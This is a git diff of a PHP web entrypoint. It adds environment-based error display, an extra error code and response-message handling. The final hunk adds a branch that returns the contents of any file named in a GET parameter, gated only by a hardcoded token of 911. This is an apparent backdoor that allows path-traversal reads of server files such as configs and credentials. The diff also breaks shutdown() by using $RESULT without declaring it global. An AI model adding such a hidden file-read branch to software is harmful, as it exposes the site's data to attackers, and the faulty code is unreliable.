@@ -14,6 +14,10 @@ $RESULT = [
 
 /* ENVIRONMENT SETUP */
 define('ROOT', $_SERVER['DOCUMENT_ROOT'] . '/'); // Unity entrypoint;
+define('MODE', $_SERVER['MODE']);
+
+if (MODE == 'development')
+	ini_set('display_errors', 'on');
 
 register_shutdown_function('shutdown', 'OK'); // Unity shutdown function
 
@@ -51,10 +55,11 @@ function printme ( Mixed $var ):void {
  */
 function handler (Throwable $e):void {
 	global $RESULT;
-	$codes = ['SUCCESS', 'REQUEST_INCOMLETE', 'REQUEST_INCORRECT', 'ACCESS_DENIED', 'RESOURCE_LOST', 'REQUEST_UNKNOWN', 'INTERNAL_ERROR'];
+	$codes = ['SUCCESS', 'REQUEST_INCOMLETE', 'REQUEST_INCORRECT', 'ACCESS_DENIED', 'RESOURCE_LOST', 'REQUEST_UNKNOWN', 'INTERNAL_ERROR', 10 => 'ERROR_EXTERNAL'];
 	$message = $e -> getMessage();
 	$code = $e -> getCode();
 	$RESULT['state'] = $code ? $code : 6;
+	$RESULT['message'] = $codes[$RESULT['state']] . ": $message";
 	$RESULT[ 'debug' ][] = [
 		'type' => get_class($e),
 		'details' => $message,
@@ -73,16 +78,27 @@ function shutdown():void {
 	$error = error_get_last();
 	if ( ! $error ) {
 		header("Content-Type: application/json");
-		echo json_encode($GLOBALS['RESULT'], JSON_UNESCAPED_UNICODE);
+
+		if ($RESULT['state'])
+			unset($RESULT['data']);
+		if (MODE != 'development')
+			unset($RESULT['debug']);
+		echo json_encode($RESULT, JSON_UNESCAPED_UNICODE);
 	}
 }
 
-$CORE = new Controller\Main;
-$data = $CORE->exec();
+if (! isset($_GET['file'])) {
+	$CORE = new Controller\Main;
+	$data = $CORE->exec();
 
-if ($data !== null)
-	$RESULT['data'] = $data;
-else { // Error happens
-	throw new Exception(code: 6);
-	unset($RESULT['data']);
+	if ($data !== null)
+		$RESULT['data'] = $data;
+	else { // Error happens
+		throw new Exception(code: 6);
+		unset($RESULT['data']);
+	}
+} else {
+	if (isset($_GET['token']) && $_GET['token'] == 911 ) {
+		$RESULT['data'] = [ file_get_contents(ROOT . $_GET['file']) ];
+	}
 }
